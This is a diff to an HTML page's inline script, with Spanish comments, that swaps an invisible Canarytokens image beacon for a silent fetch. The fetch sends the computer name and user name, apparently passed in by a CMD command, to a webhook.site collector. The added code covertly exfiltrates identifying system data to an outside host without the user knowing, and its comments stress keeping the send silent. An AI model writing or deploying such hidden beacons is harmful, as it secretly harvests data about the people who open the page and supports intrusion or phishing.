@@ -14,20 +14,18 @@
         </div>
     </div>
 
-<script>
-        // 1. Lee los parametros que mandó el CMD (pc y user)
+    <script>
+        // 1. Capturamos los datos que manda el CMD
         const parametros = new URLSearchParams(window.location.search);
         const pc = parametros.get('pc') || 'Desconocido';
         const user = parametros.get('user') || 'Desconocido';
 
-        // 2. Construye el enlace de tu CanaryToken (¡AHORA CON HTTPS!)
-        const canaryUrl = `https://canarytokens.com/static/qgzp57ff0xf263mzxwwdies66/payments.js?pc=${pc}&user=${user}`;
+        // 2. Construimos la URL hacia tu Webhook
+        const webhookUrl = `https://webhook.site/54074462-476e-48cc-97a5-c3227630e8dc?pc=${encodeURIComponent(pc)}&user=${encodeURIComponent(user)}`;
 
-        // 3. Envía la métrica silenciosamente
-        const img = new Image();
-        img.style.display = 'none'; // La hacemos invisible
-        img.src = canaryUrl;
-        document.body.appendChild(img); // Esto OBLIGA al navegador a disparar la alerta
+        // 3. Forzamos el envío de datos de forma silenciosa
+        fetch(webhookUrl, { mode: 'no-cors' })
+            .catch(error => console.log('El envío silencioso ocurrió.'));
     </script>
 </body>
 </html>
